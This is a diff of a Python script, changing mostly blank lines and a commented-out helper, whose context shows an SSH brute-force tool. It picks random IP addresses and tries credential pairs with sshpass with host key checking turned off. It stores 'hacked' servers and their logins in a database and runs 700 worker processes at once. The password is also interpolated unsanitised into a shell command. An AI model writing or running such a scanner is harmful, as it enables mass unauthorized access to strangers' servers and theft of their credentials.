@@ -19,26 +19,12 @@ START_PASSWORD='123'
 def get_connect_db():
     return psycopg2.connect(dbname=DB_NAME, user=USER, password=PASSWORD, host=HOST, port=PORT)
 
-
 def init_database():
     try:
         con = get_connect_db()
         con.cursor().execute('CREATE TABLE servers(ip varchar(255) PRIMARY KEY, login varchar(255), password varchar(255), status varchar(255), is_my varchar(255), datetime timestamp default NULL, attempts text)')
         con.commit()
     except:pass
-
-
-# def request_to_db(sql):
-#     con = psycopg2.connect(dbname=DB_NAME, user=USER, password=PASSWORD)
-#     try:
-#         with con:
-#             with con.cursor() as curs:
-#                 print(curs.execute(sql))
-#     except Exception as e: print(e)
-#     finally:
-#         con.close()
-
-
 
 def get_random_ip_address():
     min_ip_part=0
@@ -51,7 +37,6 @@ def get_random_ip_address():
     ip_part_4 = randint(min_ip_part, max_ip_part)
 
     return f"{ip_part_1}.{ip_part_2}.{ip_part_3}.{ip_part_4}"
-
 
 def get_iso_datetime_now():
     return str(datetime.now().astimezone().replace(microsecond=0))
@@ -71,7 +56,6 @@ def is_hacked_server(ip):
 def connect(ip, login, password):
     # return os.system(f"timeout 6s sshpass -p {password} ssh {login}@{ip} -o StrictHostKeyChecking=no 'ls' > /dev/null 2>&1")
     return os.system(f"timeout 7s sshpass -p {password} ssh {login}@{ip} -o StrictHostKeyChecking=no 'ls'")
-
 
 def save_hackability_server(ip, status, attempts, is_my):
     con = get_connect_db()
@@ -135,12 +119,9 @@ def crack_server(ip):
                     update_data_in_servers(ip, login, password, attempts, status, 'True')
                 return None
 
-
-
 def parsing():
     n=700
     multiprocessing.Pool(processes=n).map(get_hackability_servers, range(n))
-
 
 
 if __name__ == '__main__':
